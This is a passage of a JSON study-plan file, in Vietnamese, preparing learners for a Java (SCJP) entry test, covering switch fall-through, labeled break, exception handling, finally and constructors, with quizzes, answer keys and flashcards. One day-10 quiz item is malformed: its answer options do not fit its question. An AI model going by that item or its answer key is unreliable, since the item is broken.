      "source": "SCJP Chapter 4 (Ch04.pdf) & TestKing",
      "objectives": [
        "Nắm vững các kiểu dữ liệu hợp lệ trong switch: byte, short, char, int, enum, String.",
        "Quy tắc bất biến của nhãn case: Phải là hằng số hoặc biến final đã khởi tạo tại thời điểm biên dịch (Compile-time Constant).",
        "Hiện tượng rơi tự do (Fall-Through) khi thiếu lệnh break trong switch.",
        "Vòng lặp có nhãn (Labeled break / continue): Thoát hoặc nhảy bước ở vòng lặp ngoài lồng nhau."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Toàn Diện Cấu Trúc switch & Cạm Bẫy Nhãn case",
          "sourceRef": "SCJP Objective 2.1 (Ch04.pdf, Page 4-18)",
          "theory": "\n#### 1. Các kiểu dữ liệu ĐƯỢC PHÉP dùng trong switch:\n- Trong Java 1.4/5/6: `byte`, `short`, `char`, `int` (và các Wrapper tương ứng), `enum`.\n- Từ Java 7: Bổ sung thêm `String`.\n- **CẤM DÙNG TRONG switch (Compile Error):** `long`, `float`, `double`, `boolean`!\n\n#### 2. Quy tắc của nhãn case:\n- Biểu thức trong `case` **BẮT BUỘC PHẢI LÀ COMPILE-TIME CONSTANT** (hằng số hoặc biến `final` đã có giá trị lúc compile). Biến thường không thể làm case!\n- Giá trị trong case phải nằm trong khoảng biểu diễn của kiểu dữ liệu ở switch (ví dụ `byte b` thì `case 200:` bị Compile Error vì 200 vượt quá byte).\n- Hai case không được phép trùng giá trị (Duplicate case label).\n\n#### 3. Hiện tượng Fall-Through:\n- Nếu khớp một `case` mà **KHÔNG CÓ LỆNH `break`**, luồng thực thi sẽ rơi tự do và chạy tiếp TẤT CẢ các lệnh của các case bên dưới (kể cả khối `default`) cho đến khi gặp `break` hoặc hết switch!\n",
          "code": "int x = 2;\nfinal int ONE = 1;\nint two = 2; // Biến thường, không có final!\n\nswitch (x) {\n    case ONE: System.out.print(\"1 \"); break;\n    // case two: // COMPILE ERROR: constant expression required!\n    case 2: System.out.print(\"2 \"); // Không có break -> Fall-through!\n    case 3: System.out.print(\"3 \"); break;\n    default: System.out.print(\"def \");\n}\n// In ra: 2 3"
        },
        {
          "id": "partB",
          "title": "Part B: Labeled break và continue trong Vòng Lặp Lồng Nhau",
          "sourceRef": "SCJP Objective 2.2 (Ch04.pdf, Page 20-28)",
          "theory": "\nTrong các vòng lặp lồng nhau (Nested Loops), lệnh `break` hoặc `continue` thông thường chỉ tác động lên **vòng lặp trong cùng gần nhất**.\n\nĐể can thiệp vào vòng lặp cha bên ngoài, Java cung cấp cơ chế **Nhãn (Label)**:\n- `break outerLabel;`: Lập tức thoát khỏi hoàn toàn vòng lặp có gắn nhãn `outerLabel`.\n- `continue outerLabel;`: Dừng lần lặp hiện tại của vòng lặp trong, nhảy thẳng về bước lặp tiếp theo của vòng lặp `outerLabel`.\n",
          "code": "outer:\nfor (int i = 0; i < 3; i++) {\n    for (int j = 0; j < 3; j++) {\n        if (i == 1 && j == 1) {\n            break outer; // Thoát hẳn cả 2 vòng lặp!\n        }\n        System.out.print(i + \"\" + j + \" \");\n    }\n}\n// In ra: 00 01 02 10"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d8_1",
          "level": "Hard",
          "question": "Kết quả in ra của đoạn mã sau là gì?",
          "code": "public class SwitchTrap {\n    public static void main(String[] args) {\n        int k = 1;\n        switch (k) {\n            default: System.out.print(\"def \");\n            case 2: System.out.print(\"2 \"); break;\n            case 3: System.out.print(\"3 \");\n        }\n    }\n}",
          "options": [
            "def 2 ",
            "def ",
            "3 ",
            "def 2 3 "
          ],
          "correctIndex": 0,
          "explanation": "1. `k = 1` không khớp với `case 2` hay `case 3`, do đó chương trình nhảy vào khối `default:`.\n2. In ra: `def `.\n3. Do sau `default:` không có câu lệnh `break`, chương trình bị Fall-Through rơi xuống `case 2:` và in tiếp `2 `.\n4. Tại `case 2:` có lệnh `break;`, chương trình thoát khỏi switch. Kết quả: `def 2 `."
        }
      ],
      "examTraps": [
        {
          "trap": "Vị trí của khối default trong switch",
          "whyPeopleWrong": "Tưởng rằng default luôn luôn được thực thi ở cuối cùng.",
          "wrongThinking": "Nghĩ rằng default đặt ở đầu hay ở giữa sẽ chạy trước các case.",
          "correctRule": "Khối default CHỈ ĐƯỢC CHẠY khi không có bất kỳ case nào khớp. Tuy nhiên, nếu default không có lệnh break, luồng thực thi vẫn bị Fall-Through rơi tiếp xuống các case nằm phía dưới nó!",
          "code": "int x = 99;\nswitch(x) {\n    default: System.out.print(\"D \");\n    case 1: System.out.print(\"1 \");\n}\n// In ra: D 1 (Rơi tự do từ default xuống case 1!)",
          "miniCheck": "Kiểm tra xem default có break hay không, nếu không có break thì các lệnh bên dưới nó vẫn bị thực thi!"
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Cấu trúc điều khiển luồng",
          "questions": [
            {
              "q": "Câu lệnh `switch` trong Java (trước Java 12) hỗ trợ những kiểu dữ liệu nào?",
              "ans": "`byte`, `short`, `char`, `int`, các wrapper class tương ứng (`Byte`, `Short`, `Character`, `Integer`), `String` (từ Java 7), và `enum`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Nguyên lý fall-through trong switch-case",
          "questions": [
            {
              "q": "Hiện tượng fall-through xảy ra khi nào trong câu lệnh `switch`?",
              "ans": "Khi một khối `case` khớp điều kiện nhưng không có câu lệnh `break;`, luồng điều khiển sẽ tiếp tục rơi xuống và thực thi toàn bộ các câu lệnh của các `case` tiếp theo (kể cả `default`) bất kể điều kiện có khớp hay không."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace switch case không có break",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint day = 2;\nswitch (day) {\n    case 1: System.out.print(\"1\");\n    case 2: System.out.print(\"2\");\n    case 3: System.out.print(\"3\");\n    default: System.out.print(\"D\");\n}\n```\nKết quả in ra màn hình là gì?",
              "ans": "In ra: `23D`. Khớp `case 2`, in ra '2'. Do không có `break`, tiếp tục thực thi `case 3` in ra '3', tiếp tục fall-through sang `default` in ra 'D'."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy hằng số hằng định case",
          "questions": [
            {
              "q": "Đoạn code sau có biên dịch được không?\n```java\nint x = 10;\nint y = 5;\nswitch(x) {\n    case y: System.out.println(\"Match\");\n}\n```",
              "ans": "Compile Error: `constant expression required`. Giá trị trong biểu thức `case` bắt buộc phải là hằng số lúc compile (compile-time constant, ví dụ literal hoặc biến `final` đã được khởi tạo)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Labeled break trong vòng lặp lồng nhau",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nouter: for(int i=0; i<3; i++) {\n    for(int j=0; j<3; j++) {\n        if(i == 1 && j == 1) break outer;\n        System.out.print(\"\" + i + j + \" \");\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `00 01 02 10 `. Khi `i=1` và `j=1`, lệnh `break outer;` lập tức thoát khỏi cả vòng lặp ngoài cùng, chấm dứt hoàn toàn chương trình."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_8_1",
          "q": "Kiểu dữ liệu nào sau đây KHÔNG THỂ sử dụng làm biểu thức điều kiện trong switch (Java 8)?",
          "options": [
            "long",
            "char",
            "String",
            "byte"
          ],
          "correct": 0,
          "exp": "Trong Java, switch không hỗ trợ kiểu long, float, double, và boolean. Các kiểu được hỗ trợ là byte, short, char, int, enum, String."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Những kiểu dữ liệu nào ĐƯỢC PHÉP và KHÔNG ĐƯỢC PHÉP dùng trong biểu thức `switch`?",
          "a": "- ĐƯỢC PHÉP: `byte`, `short`, `char`, `int`, các wrapper tương ứng (`Byte`, `Short`, `Character`, `Integer`), `enum` và `String` (từ Java 7).\n- CẤM TUYỆT ĐỐI: `boolean`, `long`, `float`, `double`.",
          "trap": "Đề thi hay cho `switch(longVar)` hoặc `switch(doubleVar)` -> Compile Error ngay lập tức!"
        },
        {
          "q": "Điều kiện bắt buộc đối với các nhãn `case` trong câu lệnh `switch`?",
          "a": "Giá trị sau `case` phải là Hằng số thời điểm biên dịch (Compile-time Constant Expression) tương thích kiểu với biểu thức switch. Không được dùng biến thường (non-final) và không được trùng lặp giá trị case.",
          "trap": "Dùng biến `int x = 1; case x:` bị lỗi nếu `x` không có từ khóa `final`!"
        },
        {
          "q": "Hiện tượng 'Fall-through' trong `switch-case` xảy ra khi nào?",
          "a": "Khi một case khớp điều kiện nhưng không có lệnh `break`, luồng thực thi sẽ tiếp tục chạy thẳng xuống TẤT CẢ các case tiếp theo (bất kể điều kiện case có khớp hay không) cho đến khi gặp `break` hoặc hết switch.",
          "trap": "Bẫy tính toán output khi cố tình bỏ quên từ khóa `break`."
        }
      ],
      "dailyEnglish": [
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        },
        {
          "id": 23,
          "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
          "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
        },
        {
          "id": 24,
          "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
          "en": "Get list from table ABC by inputted conditions"
        },
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        },
        {
          "id": 26,
          "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
          "en": "Do not input space at the beginning of string"
        }
      ],
      "chapter": "Chapter 4: Flow Control"
    },
    "9": {
      "day": 9,
      "week": 2,
      "title": "Chapter 4: Exceptions & Assertions",
      "topics": [
        "Exception hierarchy: Throwable -> Error vs Exception (Checked vs Unchecked)",
        "try, catch, finally block execution order",
        "Bẫy: return trong try vs return trong finally",
        "throw vs throws",
        "Assertion syntax & ea flag"
      ],
      "tasks": [
        "Tự viết code: try { return 1; } finally { return 2; } xem trả về gì!",
        "Phân biệt catch (ChildException) trước hay ParentException trước"
      ],
      "englishDrill": [
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        },
        {
          "id": 26,
          "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
          "en": "Do not input space at the beginning of string"
        },
        {
          "id": 27,
          "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
          "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
        },
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        },
        {
          "id": 29,
          "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
          "en": "If fields of city and name are not null, search by 2 above conditions"
        }
      ],
      "summary": "Chapter 4: Exceptions & Assertions (try, catch, finally, throw, throws, catch order).",
      "coreTheory": "\n### 1. Phân cấp Ngoại lệ (Exception Hierarchy)\n- `Throwable` là lớp cha cao nhất, gồm 2 nhánh: `Error` (lỗi nghiêm trọng JVM, không nên bắt) và `Exception`.\n- **Checked Exception:** Kế thừa từ `Exception` (trừ RuntimeException), bắt buộc phải xử lý bằng `try-catch` hoặc khai báo `throws` (ví dụ `IOException`, `SQLException`).\n- **Unchecked Exception:** Kế thừa từ `RuntimeException` (ví dụ `NullPointerException`, `ArrayIndexOutOfBoundsException`), không bắt buộc khai báo.\n\n### 2. Thứ tự Catch & Khối finally\n- Catch class con trước, class cha sau. Nếu bắt class cha trước con $\\rightarrow$ Compile Error (Unreachable catch block).\n- Khối `finally` **LUÔN LUÔN ĐƯỢC CHẠY** (ngay cả khi try/catch có lệnh `return`).\n- Lệnh `return` trong `finally` sẽ ghi đè mọi return hoặc exception phía trước.\n",
      "codeSnippet": "public static int testFinally() {\n    try {\n        return 10;\n    } finally {\n        return 20; // Ghi đè! Phương thức sẽ trả về 20!\n    }\n}",
      "traps": [
        "Khối finally chỉ không chạy khi gọi `System.exit(0)` hoặc JVM crash.",
        "Bắt `catch(Exception e)` trước `catch(IOException e)` bị lỗi biên dịch."
      ],
      "quickQuiz": [
        {
          "q": "RuntimeException có bắt buộc phải dùng throws không?",
          "a": "Không, vì nó là Unchecked Exception."
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm Hàng Đầu Entry Test)",
      "source": "SCJP Chapter 4 (Ch04.pdf) & TestKing",
      "objectives": [
        "Vẽ chuẩn xác Cây phả hệ Ngoại lệ (Throwable -> Error & Exception -> RuntimeException).",
        "Phân biệt Checked Exception vs Unchecked Exception.",
        "Làm chủ thứ tự bắt lỗi: Phải bắt ngoại lệ con TRƯỚC ngoại lệ cha (Unreachable catch block error).",
        "Cạm bẫy khối finally: Return trong finally ghi đè mọi return trước đó; System.exit(0) là trường hợp duy nhất finally không chạy.",
        "Cú pháp và cờ bật Assertion: assert expression1 : expression2, java -ea."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Cây Phả Hệ Ngoại Lệ & Quy Tắc Try-Catch",
          "sourceRef": "SCJP Objective 2.4 & 2.5 (Ch04.pdf, Page 30-55)",
          "theory": "\n#### 1. Cây Phả Hệ Ngoại Lệ:\n- **`Throwable`** (Gốc rễ cao nhất):\n  - **`Error`**: Các lỗi nghiêm trọng thuộc về hạ tầng hệ thống/JVM (`OutOfMemoryError`, `StackOverflowError`). Chương trình KHÔNG NÊN cố gắng bắt (catch) lỗi này.\n  - **`Exception`**:\n    - **`RuntimeException` (Unchecked Exception)**: Lỗi do sai sót logic lập trình (`NullPointerException`, `ArrayIndexOutOfBoundsException`, `ArithmeticException`, `ClassCastException`). Không bắt buộc phải try-catch.\n    - **Checked Exception**: Tất cả các Exception khác không thuộc nhánh Runtime (`IOException`, `SQLException`, `ClassNotFoundException`). Bắt buộc phải xử lý bằng `try-catch` hoặc khai báo `throws`.\n\n#### 2. Quy tắc thứ tự các khối catch:\n- Các khối `catch` phải được sắp xếp theo thứ tự **TỪ CON ĐẾN CHA** (từ cụ thể đến tổng quát).\n- Nếu đặt `catch (Exception e)` lên trước `catch (IOException e)`, trình biên dịch sẽ báo lỗi: **\"Exception java.io.IOException has already been caught (Unreachable block)\"**.\n",
          "code": "try {\n    int x = 10 / 0;\n} catch (ArithmeticException e) {\n    System.out.println(\"Bắt đúng lỗi con cụ thể trước!\");\n} catch (Exception e) {\n    System.out.println(\"Bắt lỗi cha tổng quát sau!\");\n}\n// Nếu đảo ngược 2 khối catch trên -> COMPILE ERROR!"
        },
        {
          "id": "partB",
          "title": "Part B: Bẫy Khối Finally & Cú Pháp Assertions",
          "sourceRef": "SCJP Objective 2.6 (Ch04.pdf, Page 56-78)",
          "theory": "\n#### 1. Các Cạm Bẫy của khối finally:\n- Khối `finally` **LUÔN LUÔN ĐƯỢC THỰC THI**, bất kể có exception xảy ra hay không, kể cả khi trong `try` hoặc `catch` có lệnh `return`!\n- **Bẫy Ghi đè Return:** Nếu khối `try` return giá trị `A`, nhưng `finally` return giá trị `B`, thì giá trị cuối cùng trả về sẽ là `B`! Lệnh return của finally ghi đè và dập tắt mọi return hoặc exception đang ném ra trước đó.\n- **Trường hợp duy nhất finally không chạy:** Khi có lệnh **`System.exit(0);`** (hoặc JVM bị crash/mất nguồn).\n\n#### 2. Cơ chế Assertions trong Java:\n- Cú pháp: `assert expression1;` hoặc `assert expression1 : expression2;` (trong đó expression1 phải trả về `boolean`, expression2 là thông điệp hiển thị khi sai).\n- Mặc định khi chạy chương trình, **Assertions bị TẮT**. Muốn bật phải truyền cờ **`-ea` (enableassertions)** vào máy ảo: `java -ea MyClass`.\n",
          "code": "public class FinallyTrap {\n    public static int test() {\n        try {\n            return 1;\n        } finally {\n            return 2; // Ghi đè toàn bộ! Hàm trả về 2!\n        }\n    }\n    public static void main(String[] args) {\n        System.out.println(test()); // In ra: 2\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d9_1",
          "level": "Hard",
          "question": "Chương trình sau in ra kết quả gì?",
          "code": "public class ExTrace {\n    public static int calc() {\n        int x = 10;\n        try {\n            x += 5;\n            return x;\n        } catch (Exception e) {\n            x += 10;\n            return x;\n        } finally {\n            x += 20;\n            System.out.print(x + \" \");\n        }\n    }\n    public static void main(String[] args) {\n        System.out.println(calc());\n    }\n}",
          "options": [
            "35 15",
            "35 35",
            "15 35",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "1. Trong try: `x += 5` -> `x = 15`. Gặp lệnh `return x;`, Java sao chép giá trị 15 vào bộ nhớ đệm trả về.\n2. Trước khi return, Java bắt buộc phải chạy khối `finally`.\n3. Trong finally: `x += 20` -> `x = 35`. Lệnh `System.out.print(x + \" \")` in ra `35 `.\n4. Vì trong finally KHÔNG CÓ lệnh return mới, giá trị trả về đã được lưu đệm từ try (15) được xuất ra ở hàm main.\n-> Kết quả in ra: `35 15`."
        }
      ],
      "examTraps": [
        {
          "trap": "Finally thay đổi biến kiểu primitive trong try return",
          "whyPeopleWrong": "Thấy finally tăng x += 20 nên tưởng giá trị return của hàm cũng tăng theo.",
          "wrongThinking": "Tưởng rằng return x sẽ đọc giá trị x sau khi finally chạy xong.",
          "correctRule": "Khi try gặp return primitive, giá trị đó đã được copy lưu trữ vào ngăn xếp trả về. Các thay đổi đối với biến primitive trong finally không làm thay đổi giá trị trả về trừ khi chính finally có lệnh return riêng!",
          "code": "int x = 5;\ntry { return x; } finally { x = 10; } // Vẫn trả về 5!",
          "miniCheck": "Chỉ khi trong finally có chữ 'return' thì giá trị return mới bị ghi đè."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Cây phân cấp Ngoại lệ",
          "questions": [
            {
              "q": "Lớp gốc của tất cả các ngoại lệ và lỗi trong Java là gì? Nêu 2 nhánh con trực tiếp của nó.",
              "ans": "Lớp gốc là `java.lang.Throwable`. Hai nhánh con trực tiếp là `java.lang.Exception` (có thể bắt và xử lý) và `java.lang.Error` (lỗi hệ thống nghiêm trọng của JVM, không nên bắt)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Checked Exception vs Unchecked Exception",
          "questions": [
            {
              "q": "Sự khác biệt cốt lõi giữa Checked Exception và Unchecked Exception là gì?",
              "ans": "Checked Exception (kế thừa `Exception` nhưng không kế thừa `RuntimeException`): Bắt buộc phải xử lý bằng `try-catch` hoặc khai báo `throws` ở chữ ký phương thức (trình biên dịch bắt buộc kiểm tra). Unchecked Exception (kế thừa `RuntimeException` hoặc `Error`): Không bắt buộc khai báo hay xử lý lúc biên dịch."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace thứ tự các khối catch",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\ntry {\n    String s = null;\n    System.out.println(s.length());\n} catch (NullPointerException e) {\n    System.out.print(\"NPE \");\n} catch (RuntimeException e) {\n    System.out.print(\"RE \");\n} finally {\n    System.out.print(\"FIN\");\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `NPE FIN`. Phép gọi `s.length()` ném `NullPointerException`. Khối `catch (NullPointerException e)` khớp đầu tiên nên được thực thi, sau đó khối `finally` luôn được chạy."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Unreachable Catch Block",
          "questions": [
            {
              "q": "Đoạn code sau bị lỗi gì khi biên dịch?\n```java\ntry {\n    throw new IOException();\n} catch (Exception e) {\n    System.out.println(\"Exp\");\n} catch (IOException e) {\n    System.out.println(\"IO\");\n}\n```",
              "ans": "Compile Error: `unreachable catch block for IOException. It is already handled by the catch block for Exception`. Khối catch ngoại lệ cha (`Exception`) không được đặt trước ngoại lệ con (`IOException`)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Multi-catch syntax và tính bất biến",
          "questions": [
            {
              "q": "Trong cú pháp multi-catch `catch (IOException | SQLException e)`, biến `e` có đặc điểm gì đặc biệt?",
              "ans": "Biến tham chiếu `e` trong cú pháp multi-catch ngầm định là `final`. Mọi hành động gán lại `e = new IOException();` bên trong khối catch sẽ gây lỗi Compile Error."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_9_1",
          "q": "Lớp nào sau đây là Checked Exception?",
          "options": [
            "java.io.IOException",
            "java.lang.NullPointerException",
            "java.lang.ArrayIndexOutOfBoundsException",
            "java.lang.ClassCastException"
          ],
          "correct": 0,
          "exp": "IOException kế thừa trực tiếp từ Exception (không thuộc nhánh RuntimeException) nên là Checked Exception, bắt buộc phải có try-catch hoặc throws."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Phân biệt Checked Exception và Unchecked Exception trong cây thừa kế `Throwable`?",
          "a": "- Checked Exception (kế thừa `Exception` trừ `RuntimeException`): Bắt buộc phải try-catch hoặc khai báo `throws` ở signature (vd: `IOException`, `SQLException`).\n- Unchecked Exception (kế thừa `RuntimeException` hoặc `Error`): Không bắt buộc xử lý (vd: `NullPointerException`, `ArrayIndexOutOfBoundsException`).",
          "trap": "Cố tình `catch(IOException)` khi trong khối try không hề có dòng code nào có khả năng ném IOException sẽ bị Compile Error!"
        },
        {
          "q": "Khối `finally` có LUÔN LUÔN được thực thi không? Có trường hợp ngoại lệ nào không?",
          "a": "Khối `finally` luôn chạy kể cả khi có exception hay có lệnh `return` trong try/catch. Trường hợp DUY NHẤT finally không chạy là gọi `System.exit(0)` hoặc máy ảo JVM bị crash/mất nguồn.",
          "trap": "Nếu cả `try` và `finally` đều có lệnh `return`, giá trị return trong khối `finally` sẽ ghi đè và là giá trị trả về cuối cùng!"
        },
        {
          "q": "Thứ tự bắt các khối `catch` khi có quan hệ cha-con?",
          "a": "Phải bắt ngoại lệ con (subclass) trước, ngoại lệ cha (superclass) sau. Nếu đặt `catch(Exception e)` trước `catch(IOException e)` thì catch của con sẽ bị unreachable code -> Compile Error.",
          "trap": "Đề thi hay đảo ngược vị trí catch Exception lên đầu để lừa thí sinh."
        }
      ],
      "dailyEnglish": [
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        },
        {
          "id": 26,
          "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
          "en": "Do not input space at the beginning of string"
        },
        {
          "id": 27,
          "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
          "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
        },
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        },
        {
          "id": 29,
          "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
          "en": "If fields of city and name are not null, search by 2 above conditions"
        }
      ],
      "chapter": "Chapter 4: Exceptions & Assertions"
    },
    "10": {
      "day": 10,
      "week": 2,
      "title": "Chapter 5: OOP - Encapsulation & Inheritance",
      "topics": [
        "Encapsulation (getter/setter, data hiding)",
        "IS-A (kế thừa extends/implements) vs HAS-A (composition)",
        "Constructor rules: default constructor, super() và this() gọi ở dòng đầu tiên",
        "Constructor chaining"
      ],
      "tasks": [
        "Thử nghiệm: Class cha không có default constructor thì class con khai báo thế nào?",
        "Làm 20 câu Ch5 TestKing"
      ],
      "englishDrill": [
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        },
        {
          "id": 29,
          "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
          "en": "If fields of city and name are not null, search by 2 above conditions"
        },
        {
          "id": 30,
          "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
          "en": "If fields of city, year and name are null, show all lists from Trainer table"
        },
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        },
        {
          "id": 32,
          "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
          "en": "Set values for undefined variables at invisible CLASS"
        }
      ],
      "summary": "Chapter 5: OOP - Encapsulation, IS-A vs HAS-A, Constructors & super()/this().",
      "coreTheory": "\n### 1. Đóng gói (Encapsulation) & Mối quan hệ\n- **Encapsulation:** Biến thuộc tính để `private`, cung cấp getter/setter `public`.\n- **IS-A (Kế thừa):** Class con kế thừa class cha (`Car extends Vehicle`).\n- **HAS-A (Chứa đựng):** Class chứa đối tượng khác (`Car has an Engine`).\n\n### 2. Quy tắc Constructor\n- Constructor có tên trùng với class và **KHÔNG CÓ KIỂU TRẢ VỀ** (kể cả `void` - nếu có `void` nó biến thành method bình thường!).\n- Lời gọi `super()` hoặc `this()` **BẮT BUỘC phải nằm ở dòng lệnh đầu tiên** của constructor.\n- Nếu bạn không viết constructor nào, compiler tự tạo default constructor không tham số. Nếu bạn đã tự viết bất kỳ constructor nào, compiler sẽ KHÔNG tự tạo default constructor nữa.\n",
      "codeSnippet": "class Parent {\n    Parent(String name) {} // Có constructor có tham số\n}\n\nclass Child extends Parent {\n    // Child() {} // COMPILE ERROR: Parent() không tồn tại!\n    Child() {\n        super(\"Default\"); // Phải gọi tường minh dòng đầu tiên!\n    }\n}",
      "traps": [
        "Phương thức `public void MyClass() {}` là method thông thường, KHÔNG PHẢI constructor.",
        "Không thể gọi đồng thời cả `this()` và `super()` trong cùng 1 constructor."
      ],
      "quickQuiz": [
        {
          "q": "Nếu class cha không có constructor không tham số, class con phải làm gì?",
          "a": "Bắt buộc phải gọi super(args) tường minh ở dòng đầu."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Encapsulation (getter/setter, data hiding), IS-A (kế thừa extends/implements) vs HAS-A (composition), Constructor rules: default constructor, super() và this() gọi ở dòng đầu tiên.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Đóng gói (Encapsulation) & Mối quan hệ\n- **Encapsulation:** Biến thuộc tính để `private`, cung cấp getter/setter `public`.\n- **IS-A (Kế thừa):** Class con kế thừa class cha (`Car extends Vehicle`).\n- **HAS-A (Chứa đựng):** Class chứa đối tượng khác (`Car has an Engine`).\n\n### 2. Quy tắc Constructor\n- Constructor có tên trùng với class và **KHÔNG CÓ KIỂU TRẢ VỀ** (kể cả `void` - nếu có `void` nó biến thành method bình thường!).\n- Lời gọi `super()` hoặc `this()` **BẮT BUỘC phải nằm ở dòng lệnh đầu tiên** của constructor.\n- Nếu bạn không viết constructor nào, compiler tự tạo default constructor không tham số. Nếu bạn đã tự viết bất kỳ constructor nào, compiler sẽ KHÔNG tự tạo default constructor nữa.\n",
          "code": "class Parent {\n    Parent(String name) {} // Có constructor có tham số\n}\n\nclass Child extends Parent {\n    // Child() {} // COMPILE ERROR: Parent() không tồn tại!\n    Child() {\n        super(\"Default\"); // Phải gọi tường minh dòng đầu tiên!\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_10_1",
          "level": "Easy",
          "question": "Nếu class cha không có constructor không tham số, class con phải làm gì?",
          "code": "class Parent {\n    Parent(String name) {} // Có constructor có tham số\n}\n\nclass Child extends Parent {\n    // Child() {} // COMPILE ERROR: Parent() không tồn tại!\n    Child() {\n        super(\"Default\"); // Phải gọi tường minh dòng đầu tiên!\n    }\n}",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Bắt buộc phải gọi super(args) tường minh ở dòng đầu."
        }
      ],
      "examTraps": [
        {
          "trap": "Getter trả về trực tiếp đối tượng khả biến (Mutable Object)",
          "whyPeopleWrong": "Tưởng rằng private Date dob; đã an toàn khi có getDob() { return dob; }.",
          "wrongThinking": "Nghĩ rằng private đã bảo vệ hoàn toàn dữ liệu.",
          "correctRule": "Nếu getter trả về trực tiếp đối tượng Date hoặc List, bên ngoài có thể gọi dob.setTime(...) làm thay đổi dữ liệu bên trong! Phải trả về bản copy: return new Date(dob.getTime());",
          "code": "private Date dob;\npublic Date getDob() { return new Date(dob.getTime()); } // Defensive Copying",
          "miniCheck": "Luôn dùng Defensive Copying khi trả về đối tượng có thể thay đổi thuộc tính."
        },
        {
          "trap": "Cạm bẫy 1: Phương thức `public void MyClass() {}` là method thông thường, KHÔNG PHẢI constructor.",
